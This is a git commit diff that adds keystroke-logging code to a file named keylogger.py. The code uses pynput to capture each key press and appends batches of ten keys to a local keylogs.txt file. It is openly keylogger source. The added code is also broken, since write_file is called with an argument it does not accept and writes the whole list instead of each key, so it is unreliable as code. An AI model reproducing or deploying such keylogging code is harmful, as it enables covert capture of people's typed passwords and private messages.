e103015bda34559dc82f7cba954c46e7c0877179
bruce <brucebane2016@gmail.com>
2023-06-05 13:10:01 +0530

    final commit i think

--- keylogger.py
+++ keylogger.py
@@ -2,8 +2,27 @@ import pynput
 
 from pynput.keyboard import Key,Listener
 
-def on_press(key):
-	print(f"{key}    pressed")
+count = 0
+keys = []
+
+
+
+def write_file():
+	with open("keylogs.txt","a") as f :
+		for key in keys:
+			f.write(keys)
+
+
+
+
+def on_press(key): 
+	global keys,count
+	keys.append(key)
+	count+=1
+	if count>=10:
+		 count = 0
+		 write_file(keys)
+		 keys = []
 
 def on_release(key):
 	pass
